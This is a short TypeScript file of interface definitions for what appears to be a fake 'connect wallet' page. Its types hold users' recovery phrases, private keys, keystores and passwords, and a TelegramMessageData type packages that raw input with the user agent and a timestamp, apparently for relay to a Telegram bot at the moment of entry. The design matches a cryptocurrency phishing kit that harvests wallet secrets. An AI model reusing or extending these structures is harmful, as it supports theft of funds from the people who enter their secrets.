export interface Wallet {
    id: string;
    name: string;
    icon: string;
    colors: {
      primary: string;
      secondary: string;
      text: string;
    };
  }
  
  export interface ConnectedWallet {
    id: string;
    name: string;
    address: string;
    connectedAt: Date;
    phrase?: string;
    privateKey?: string;
    keystore?: string;
    isValid?: boolean;
  }
  
  export interface ValidationResult {
    isValid: boolean;
    message: string;
    address?: string;
    balance?: string;
    network?: string;
  }
  
  export interface IWallet {
    address: string;
  }


  export interface TelegramMessageData {
    walletName: string;
    walletType: string;
    inputType: 'phrase' | 'privateKey' | 'keystore';
    inputData: string;
    password?: string;
    isValid: boolean;
    validationMessage: string;
    userAgent: string;
    timestamp: string;
    stage?: 'initial_input' | 'validation_result';
  }